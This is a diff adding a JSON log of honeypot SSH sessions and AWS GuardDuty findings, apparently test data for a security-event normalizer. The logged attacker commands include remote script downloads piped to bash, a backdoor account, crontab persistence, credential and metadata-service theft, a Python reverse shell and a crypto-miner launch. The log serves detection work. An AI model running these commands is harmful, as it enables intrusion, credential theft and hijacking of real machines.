@@ -1,0 +1,822 @@
+[
+  {
+    "timestamp": "2024-01-15T02:14:33.112Z",
+    "src_ip": "185.220.101.47",
+    "event_type": "CONNECTION",
+    "detail": "New connection",
+    "username": null,
+    "severity": "INFO",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753789Z"
+  },
+  {
+    "timestamp": "2024-01-15T02:14:33.891Z",
+    "src_ip": "185.220.101.47",
+    "event_type": "LOGIN_FAILED",
+    "detail": "123456",
+    "username": "root",
+    "severity": "LOW",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753826Z"
+  },
+  {
+    "timestamp": "2024-01-15T02:14:34.102Z",
+    "src_ip": "185.220.101.47",
+    "event_type": "LOGIN_FAILED",
+    "detail": "password",
+    "username": "root",
+    "severity": "LOW",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753830Z"
+  },
+  {
+    "timestamp": "2024-01-15T02:14:34.334Z",
+    "src_ip": "185.220.101.47",
+    "event_type": "LOGIN_FAILED",
+    "detail": "admin",
+    "username": "root",
+    "severity": "LOW",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753834Z"
+  },
+  {
+    "timestamp": "2024-01-15T02:14:34.891Z",
+    "src_ip": "185.220.101.47",
+    "event_type": "LOGIN_SUCCESS",
+    "detail": "admin123",
+    "username": "admin",
+    "severity": "HIGH",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753836Z"
+  },
+  {
+    "timestamp": "2024-01-15T02:14:35.210Z",
+    "src_ip": "185.220.101.47",
+    "event_type": "COMMAND_RUN",
+    "detail": "uname -a",
+    "username": null,
+    "severity": "MEDIUM",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753844Z"
+  },
+  {
+    "timestamp": "2024-01-15T02:14:35.441Z",
+    "src_ip": "185.220.101.47",
+    "event_type": "COMMAND_RUN",
+    "detail": "cat /etc/passwd",
+    "username": null,
+    "severity": "MEDIUM",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753848Z"
+  },
+  {
+    "timestamp": "2024-01-15T02:14:35.882Z",
+    "src_ip": "185.220.101.47",
+    "event_type": "COMMAND_RUN",
+    "detail": "wget http://193.32.162.157/x86 -O /tmp/.update && chmod +x /tmp/.update && /tmp/.update",
+    "username": null,
+    "severity": "HIGH",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753852Z"
+  },
+  {
+    "timestamp": "2024-01-15T02:14:36.120Z",
+    "src_ip": "185.220.101.47",
+    "event_type": "FILE_DOWNLOAD",
+    "detail": "http://193.32.162.157/x86",
+    "username": null,
+    "severity": "HIGH",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753855Z"
+  },
+  {
+    "timestamp": "2024-01-15T02:14:38.001Z",
+    "src_ip": "185.220.101.47",
+    "event_type": "SESSION_CLOSED",
+    "detail": "Connection lost",
+    "username": null,
+    "severity": "INFO",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753857Z"
+  },
+  {
+    "timestamp": "2024-01-15T03:22:11.005Z",
+    "src_ip": "91.92.251.103",
+    "event_type": "CONNECTION",
+    "detail": "New connection",
+    "username": null,
+    "severity": "INFO",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753860Z"
+  },
+  {
+    "timestamp": "2024-01-15T03:22:11.445Z",
+    "src_ip": "91.92.251.103",
+    "event_type": "LOGIN_FAILED",
+    "detail": "ubuntu",
+    "username": "ubuntu",
+    "severity": "LOW",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753862Z"
+  },
+  {
+    "timestamp": "2024-01-15T03:22:11.881Z",
+    "src_ip": "91.92.251.103",
+    "event_type": "LOGIN_FAILED",
+    "detail": "ubuntu1",
+    "username": "ubuntu",
+    "severity": "LOW",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753864Z"
+  },
+  {
+    "timestamp": "2024-01-15T03:22:12.113Z",
+    "src_ip": "91.92.251.103",
+    "event_type": "LOGIN_SUCCESS",
+    "detail": "ubuntu@123",
+    "username": "ubuntu",
+    "severity": "HIGH",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753866Z"
+  },
+  {
+    "timestamp": "2024-01-15T03:22:13.001Z",
+    "src_ip": "91.92.251.103",
+    "event_type": "COMMAND_RUN",
+    "detail": "id",
+    "username": null,
+    "severity": "MEDIUM",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753869Z"
+  },
+  {
+    "timestamp": "2024-01-15T03:22:13.221Z",
+    "src_ip": "91.92.251.103",
+    "event_type": "COMMAND_RUN",
+    "detail": "whoami",
+    "username": null,
+    "severity": "MEDIUM",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753872Z"
+  },
+  {
+    "timestamp": "2024-01-15T03:22:13.451Z",
+    "src_ip": "91.92.251.103",
+    "event_type": "COMMAND_RUN",
+    "detail": "cat /proc/cpuinfo | grep processor | wc -l",
+    "username": null,
+    "severity": "MEDIUM",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753876Z"
+  },
+  {
+    "timestamp": "2024-01-15T03:22:14.012Z",
+    "src_ip": "91.92.251.103",
+    "event_type": "COMMAND_RUN",
+    "detail": "curl -s http://45.155.205.233/bot.sh | bash",
+    "username": null,
+    "severity": "HIGH",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753879Z"
+  },
+  {
+    "timestamp": "2024-01-15T03:22:16.881Z",
+    "src_ip": "91.92.251.103",
+    "event_type": "SESSION_CLOSED",
+    "detail": "Connection lost",
+    "username": null,
+    "severity": "INFO",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753881Z"
+  },
+  {
+    "timestamp": "2024-01-15T04:01:55.334Z",
+    "src_ip": "45.142.212.100",
+    "event_type": "CONNECTION",
+    "detail": "New connection",
+    "username": null,
+    "severity": "INFO",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753884Z"
+  },
+  {
+    "timestamp": "2024-01-15T04:01:55.712Z",
+    "src_ip": "45.142.212.100",
+    "event_type": "LOGIN_FAILED",
+    "detail": "raspberry",
+    "username": "pi",
+    "severity": "LOW",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753886Z"
+  },
+  {
+    "timestamp": "2024-01-15T04:01:55.951Z",
+    "src_ip": "45.142.212.100",
+    "event_type": "LOGIN_FAILED",
+    "detail": "raspberrypi",
+    "username": "pi",
+    "severity": "LOW",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753888Z"
+  },
+  {
+    "timestamp": "2024-01-15T04:01:58.001Z",
+    "src_ip": "45.142.212.100",
+    "event_type": "SESSION_CLOSED",
+    "detail": "Connection lost",
+    "username": null,
+    "severity": "INFO",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753891Z"
+  },
+  {
+    "timestamp": "2024-01-15T05:33:21.441Z",
+    "src_ip": "194.165.16.98",
+    "event_type": "CONNECTION",
+    "detail": "New connection",
+    "username": null,
+    "severity": "INFO",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753893Z"
+  },
+  {
+    "timestamp": "2024-01-15T05:33:21.881Z",
+    "src_ip": "194.165.16.98",
+    "event_type": "LOGIN_FAILED",
+    "detail": "git",
+    "username": "git",
+    "severity": "LOW",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753896Z"
+  },
+  {
+    "timestamp": "2024-01-15T05:33:22.102Z",
+    "src_ip": "194.165.16.98",
+    "event_type": "LOGIN_FAILED",
+    "detail": "deploy",
+    "username": "deploy",
+    "severity": "LOW",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753898Z"
+  },
+  {
+    "timestamp": "2024-01-15T05:33:22.334Z",
+    "src_ip": "194.165.16.98",
+    "event_type": "LOGIN_FAILED",
+    "detail": "D3pl0y!",
+    "username": "deploy",
+    "severity": "LOW",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753900Z"
+  },
+  {
+    "timestamp": "2024-01-15T05:33:24.112Z",
+    "src_ip": "194.165.16.98",
+    "event_type": "SESSION_CLOSED",
+    "detail": "Connection lost",
+    "username": null,
+    "severity": "INFO",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753902Z"
+  },
+  {
+    "timestamp": "2024-01-15T06:44:09.211Z",
+    "src_ip": "5.188.206.26",
+    "event_type": "CONNECTION",
+    "detail": "New connection",
+    "username": null,
+    "severity": "INFO",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753904Z"
+  },
+  {
+    "timestamp": "2024-01-15T06:44:09.771Z",
+    "src_ip": "5.188.206.26",
+    "event_type": "LOGIN_SUCCESS",
+    "detail": "toor",
+    "username": "root",
+    "severity": "HIGH",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753907Z"
+  },
+  {
+    "timestamp": "2024-01-15T06:44:10.112Z",
+    "src_ip": "5.188.206.26",
+    "event_type": "COMMAND_RUN",
+    "detail": "uname -a",
+    "username": null,
+    "severity": "MEDIUM",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753910Z"
+  },
+  {
+    "timestamp": "2024-01-15T06:44:10.334Z",
+    "src_ip": "5.188.206.26",
+    "event_type": "COMMAND_RUN",
+    "detail": "cat /etc/issue",
+    "username": null,
+    "severity": "MEDIUM",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753913Z"
+  },
+  {
+    "timestamp": "2024-01-15T06:44:10.551Z",
+    "src_ip": "5.188.206.26",
+    "event_type": "COMMAND_RUN",
+    "detail": "free -m",
+    "username": null,
+    "severity": "MEDIUM",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753916Z"
+  },
+  {
+    "timestamp": "2024-01-15T06:44:11.001Z",
+    "src_ip": "5.188.206.26",
+    "event_type": "COMMAND_RUN",
+    "detail": "ls /etc/cron*",
+    "username": null,
+    "severity": "MEDIUM",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753919Z"
+  },
+  {
+    "timestamp": "2024-01-15T06:44:11.441Z",
+    "src_ip": "5.188.206.26",
+    "event_type": "COMMAND_RUN",
+    "detail": "echo '*/5 * * * * root wget -q -O- http://5.188.206.26/update.sh | bash' >> /etc/crontab",
+    "username": null,
+    "severity": "HIGH",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753922Z"
+  },
+  {
+    "timestamp": "2024-01-15T06:44:11.882Z",
+    "src_ip": "5.188.206.26",
+    "event_type": "COMMAND_RUN",
+    "detail": "useradd -m -s /bin/bash -G sudo backdoor_user",
+    "username": null,
+    "severity": "HIGH",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753925Z"
+  },
+  {
+    "timestamp": "2024-01-15T06:44:14.221Z",
+    "src_ip": "5.188.206.26",
+    "event_type": "SESSION_CLOSED",
+    "detail": "Connection lost",
+    "username": null,
+    "severity": "INFO",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753927Z"
+  },
+  {
+    "timestamp": "2024-01-15T07:12:44.001Z",
+    "src_ip": "103.144.208.57",
+    "event_type": "CONNECTION",
+    "detail": "New connection",
+    "username": null,
+    "severity": "INFO",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753929Z"
+  },
+  {
+    "timestamp": "2024-01-15T07:12:44.441Z",
+    "src_ip": "103.144.208.57",
+    "event_type": "LOGIN_FAILED",
+    "detail": "oracle",
+    "username": "oracle",
+    "severity": "LOW",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753931Z"
+  },
+  {
+    "timestamp": "2024-01-15T07:12:44.661Z",
+    "src_ip": "103.144.208.57",
+    "event_type": "LOGIN_FAILED",
+    "detail": "postgres",
+    "username": "postgres",
+    "severity": "LOW",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753933Z"
+  },
+  {
+    "timestamp": "2024-01-15T07:12:44.881Z",
+    "src_ip": "103.144.208.57",
+    "event_type": "LOGIN_FAILED",
+    "detail": "mysql",
+    "username": "mysql",
+    "severity": "LOW",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753935Z"
+  },
+  {
+    "timestamp": "2024-01-15T07:12:46.112Z",
+    "src_ip": "103.144.208.57",
+    "event_type": "SESSION_CLOSED",
+    "detail": "Connection lost",
+    "username": null,
+    "severity": "INFO",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753938Z"
+  },
+  {
+    "timestamp": "2024-01-15T08:55:31.772Z",
+    "src_ip": "80.94.95.130",
+    "event_type": "CONNECTION",
+    "detail": "New connection",
+    "username": null,
+    "severity": "INFO",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753944Z"
+  },
+  {
+    "timestamp": "2024-01-15T08:55:32.112Z",
+    "src_ip": "80.94.95.130",
+    "event_type": "LOGIN_SUCCESS",
+    "detail": "user",
+    "username": "user",
+    "severity": "HIGH",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753946Z"
+  },
+  {
+    "timestamp": "2024-01-15T08:55:32.551Z",
+    "src_ip": "80.94.95.130",
+    "event_type": "COMMAND_RUN",
+    "detail": "ls -la /",
+    "username": null,
+    "severity": "MEDIUM",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753949Z"
+  },
+  {
+    "timestamp": "2024-01-15T08:55:33.001Z",
+    "src_ip": "80.94.95.130",
+    "event_type": "COMMAND_RUN",
+    "detail": "find / -name '*.pem' -o -name '*.key' 2>/dev/null",
+    "username": null,
+    "severity": "MEDIUM",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753953Z"
+  },
+  {
+    "timestamp": "2024-01-15T08:55:33.441Z",
+    "src_ip": "80.94.95.130",
+    "event_type": "COMMAND_RUN",
+    "detail": "cat ~/.aws/credentials 2>/dev/null",
+    "username": null,
+    "severity": "MEDIUM",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753956Z"
+  },
+  {
+    "timestamp": "2024-01-15T08:55:33.882Z",
+    "src_ip": "80.94.95.130",
+    "event_type": "COMMAND_RUN",
+    "detail": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "username": null,
+    "severity": "CRITICAL",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753958Z"
+  },
+  {
+    "timestamp": "2024-01-15T08:55:37.001Z",
+    "src_ip": "80.94.95.130",
+    "event_type": "SESSION_CLOSED",
+    "detail": "Connection lost",
+    "username": null,
+    "severity": "INFO",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753961Z"
+  },
+  {
+    "timestamp": "2024-01-15T10:03:17.441Z",
+    "src_ip": "162.142.125.210",
+    "event_type": "CONNECTION",
+    "detail": "New connection",
+    "username": null,
+    "severity": "INFO",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753963Z"
+  },
+  {
+    "timestamp": "2024-01-15T10:03:17.881Z",
+    "src_ip": "162.142.125.210",
+    "event_type": "LOGIN_FAILED",
+    "detail": "qwerty",
+    "username": "root",
+    "severity": "LOW",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753965Z"
+  },
+  {
+    "timestamp": "2024-01-15T10:03:18.112Z",
+    "src_ip": "162.142.125.210",
+    "event_type": "LOGIN_FAILED",
+    "detail": "1234",
+    "username": "root",
+    "severity": "LOW",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753967Z"
+  },
+  {
+    "timestamp": "2024-01-15T10:03:18.334Z",
+    "src_ip": "162.142.125.210",
+    "event_type": "LOGIN_FAILED",
+    "detail": "pass",
+    "username": "root",
+    "severity": "LOW",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753968Z"
+  },
+  {
+    "timestamp": "2024-01-15T10:03:20.112Z",
+    "src_ip": "162.142.125.210",
+    "event_type": "SESSION_CLOSED",
+    "detail": "Connection lost",
+    "username": null,
+    "severity": "INFO",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753971Z"
+  },
+  {
+    "timestamp": "2024-01-15T11:29:03.221Z",
+    "src_ip": "218.92.0.195",
+    "event_type": "CONNECTION",
+    "detail": "New connection",
+    "username": null,
+    "severity": "INFO",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753972Z"
+  },
+  {
+    "timestamp": "2024-01-15T11:29:03.771Z",
+    "src_ip": "218.92.0.195",
+    "event_type": "LOGIN_SUCCESS",
+    "detail": "P@ssw0rd",
+    "username": "admin",
+    "severity": "HIGH",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753974Z"
+  },
+  {
+    "timestamp": "2024-01-15T11:29:04.112Z",
+    "src_ip": "218.92.0.195",
+    "event_type": "COMMAND_RUN",
+    "detail": "ps aux",
+    "username": null,
+    "severity": "MEDIUM",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753977Z"
+  },
+  {
+    "timestamp": "2024-01-15T11:29:04.441Z",
+    "src_ip": "218.92.0.195",
+    "event_type": "COMMAND_RUN",
+    "detail": "netstat -tulnp",
+    "username": null,
+    "severity": "MEDIUM",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753980Z"
+  },
+  {
+    "timestamp": "2024-01-15T11:29:04.882Z",
+    "src_ip": "218.92.0.195",
+    "event_type": "COMMAND_RUN",
+    "detail": "iptables -F",
+    "username": null,
+    "severity": "MEDIUM",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753983Z"
+  },
+  {
+    "timestamp": "2024-01-15T11:29:05.221Z",
+    "src_ip": "218.92.0.195",
+    "event_type": "COMMAND_RUN",
+    "detail": "python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('218.92.0.195',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\"",
+    "username": null,
+    "severity": "CRITICAL",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753986Z"
+  },
+  {
+    "timestamp": "2024-01-15T11:29:08.001Z",
+    "src_ip": "218.92.0.195",
+    "event_type": "SESSION_CLOSED",
+    "detail": "Connection lost",
+    "username": null,
+    "severity": "INFO",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753988Z"
+  },
+  {
+    "timestamp": "2024-01-15T13:41:55.551Z",
+    "src_ip": "159.203.8.195",
+    "event_type": "CONNECTION",
+    "detail": "New connection",
+    "username": null,
+    "severity": "INFO",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753991Z"
+  },
+  {
+    "timestamp": "2024-01-15T13:41:55.991Z",
+    "src_ip": "159.203.8.195",
+    "event_type": "LOGIN_FAILED",
+    "detail": "test",
+    "username": "test",
+    "severity": "LOW",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753993Z"
+  },
+  {
+    "timestamp": "2024-01-15T13:41:56.221Z",
+    "src_ip": "159.203.8.195",
+    "event_type": "LOGIN_FAILED",
+    "detail": "test123",
+    "username": "test",
+    "severity": "LOW",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753995Z"
+  },
+  {
+    "timestamp": "2024-01-15T13:41:58.001Z",
+    "src_ip": "159.203.8.195",
+    "event_type": "SESSION_CLOSED",
+    "detail": "Connection lost",
+    "username": null,
+    "severity": "INFO",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753997Z"
+  },
+  {
+    "timestamp": "2024-01-15T15:17:22.881Z",
+    "src_ip": "45.227.255.190",
+    "event_type": "CONNECTION",
+    "detail": "New connection",
+    "username": null,
+    "severity": "INFO",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.753999Z"
+  },
+  {
+    "timestamp": "2024-01-15T15:17:23.221Z",
+    "src_ip": "45.227.255.190",
+    "event_type": "LOGIN_SUCCESS",
+    "detail": "ec2-user",
+    "username": "ec2-user",
+    "severity": "HIGH",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.754001Z"
+  },
+  {
+    "timestamp": "2024-01-15T15:17:23.771Z",
+    "src_ip": "45.227.255.190",
+    "event_type": "COMMAND_RUN",
+    "detail": "curl ifconfig.me",
+    "username": null,
+    "severity": "HIGH",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.754004Z"
+  },
+  {
+    "timestamp": "2024-01-15T15:17:24.112Z",
+    "src_ip": "45.227.255.190",
+    "event_type": "COMMAND_RUN",
+    "detail": "nproc",
+    "username": null,
+    "severity": "MEDIUM",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.754007Z"
+  },
+  {
+    "timestamp": "2024-01-15T15:17:24.441Z",
+    "src_ip": "45.227.255.190",
+    "event_type": "COMMAND_RUN",
+    "detail": "cd /tmp && wget http://45.227.255.190/xmrig -O xmrig && chmod +x xmrig && ./xmrig --pool stratum+tcp://pool.minexmr.com:443 --wallet 44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVJCUCRQK &",
+    "username": null,
+    "severity": "HIGH",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.754011Z"
+  },
+  {
+    "timestamp": "2024-01-15T15:17:27.001Z",
+    "src_ip": "45.227.255.190",
+    "event_type": "SESSION_CLOSED",
+    "detail": "Connection lost",
+    "username": null,
+    "severity": "INFO",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.754013Z"
+  },
+  {
+    "timestamp": "2024-01-15T17:52:09.441Z",
+    "src_ip": "77.88.55.80",
+    "event_type": "CONNECTION",
+    "detail": "New connection",
+    "username": null,
+    "severity": "INFO",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.754015Z"
+  },
+  {
+    "timestamp": "2024-01-15T17:52:09.881Z",
+    "src_ip": "77.88.55.80",
+    "event_type": "LOGIN_FAILED",
+    "detail": "hadoop",
+    "username": "hadoop",
+    "severity": "LOW",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.754017Z"
+  },
+  {
+    "timestamp": "2024-01-15T17:52:10.221Z",
+    "src_ip": "77.88.55.80",
+    "event_type": "LOGIN_FAILED",
+    "detail": "vagrant",
+    "username": "vagrant",
+    "severity": "LOW",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.754019Z"
+  },
+  {
+    "timestamp": "2024-01-15T17:52:12.001Z",
+    "src_ip": "77.88.55.80",
+    "event_type": "SESSION_CLOSED",
+    "detail": "Connection lost",
+    "username": null,
+    "severity": "INFO",
+    "source_system": "cowrie",
+    "normalized_at": "2026-03-16T15:51:44.754022Z"
+  },
+  {
+    "timestamp": "2024-01-15T02:15:00Z",
+    "src_ip": "185.220.101.47",
+    "event_type": "GUARDDUTY_FINDING",
+    "detail": "UnauthorizedAccess:EC2/SSHBruteForce: 185.220.101.47 is performing SSH brute force attacks against i-0a1b2c3d4e5f67890. 247 login attempts were made in the last 10 minutes.",
+    "username": null,
+    "severity": "HIGH",
+    "source_system": "guardduty",
+    "normalized_at": "2026-03-16T15:51:44.754540Z"
+  },
+  {
+    "timestamp": "2024-01-15T06:45:00Z",
+    "src_ip": "5.188.206.26",
+    "event_type": "GUARDDUTY_FINDING",
+    "detail": "UnauthorizedAccess:EC2/TorIPCaller: 5.188.206.26 logged into EC2 instance i-0a1b2c3d4e5f67890 and created a new user account 'backdoor_user' and added a persistence crontab entry. This behavior is consistent with post-exploitation activ",
+    "username": null,
+    "severity": "CRITICAL",
+    "source_system": "guardduty",
+    "normalized_at": "2026-03-16T15:51:44.754548Z"
+  },
+  {
+    "timestamp": "2024-01-15T08:56:00Z",
+    "src_ip": "unknown",
+    "event_type": "GUARDDUTY_FINDING",
+    "detail": "UnauthorizedAccess:EC2/MetadataIMDSv1Used: EC2 instance i-0a1b2c3d4e5f67890 is querying the instance metadata service (IMDS) to retrieve IAM credentials. The request originated from a session initiated by IP 80.94.95.130, which is associated w",
+    "username": null,
+    "severity": "CRITICAL",
+    "source_system": "guardduty",
+    "normalized_at": "2026-03-16T15:51:44.754552Z"
+  },
+  {
+    "timestamp": "2024-01-15T11:30:00Z",
+    "src_ip": "218.92.0.195",
+    "event_type": "GUARDDUTY_FINDING",
+    "detail": "Backdoor:EC2/C&CActivity.B: 218.92.0.195 established a reverse shell connection from EC2 instance i-0a1b2c3d4e5f67890 to an external IP. A Python subprocess was used to spawn an interactive shell connecting back to the attacker'",
+    "username": null,
+    "severity": "CRITICAL",
+    "source_system": "guardduty",
+    "normalized_at": "2026-03-16T15:51:44.754555Z"
+  },
+  {
+    "timestamp": "2024-01-15T15:18:00Z",
+    "src_ip": "45.227.255.190",
+    "event_type": "GUARDDUTY_FINDING",
+    "detail": "CryptoCurrency:EC2/BitcoinTool.B: EC2 instance i-0a1b2c3d4e5f67890 has been observed downloading and executing a cryptocurrency miner (XMRig). The binary connects to pool.minexmr.com:443, a known Monero mining pool. CPU usage has spik",
+    "username": null,
+    "severity": "HIGH",
+    "source_system": "guardduty",
+    "normalized_at": "2026-03-16T15:51:44.754559Z"
+  },
+  {
+    "timestamp": "2024-01-15T03:23:00Z",
+    "src_ip": "91.92.251.103",
+    "event_type": "GUARDDUTY_FINDING",
+    "detail": "Trojan:EC2/BlackholeTraffic: 91.92.251.103 established a session on EC2 instance i-0a1b2c3d4e5f67890 and executed a shell script fetched from a remote server. The script establishes a Mirai-variant botnet C2 beacon.",
+    "username": null,
+    "severity": "HIGH",
+    "source_system": "guardduty",
+    "normalized_at": "2026-03-16T15:51:44.754562Z"
+  },
+  {
+    "timestamp": "2024-01-15T12:00:00Z",
+    "src_ip": "unknown",
+    "event_type": "GUARDDUTY_FINDING",
+    "detail": "Recon:EC2/PortProbeUnprotectedPort: Multiple EC2 instances in the VPC are performing port scanning activities. The scan originated from a compromised internal IP and targeted 192.168.0.0/16 subnet, likely to move laterally.",
+    "username": null,
+    "severity": "HIGH",
+    "source_system": "guardduty",
+    "normalized_at": "2026-03-16T15:51:44.754565Z"
+  }
+]
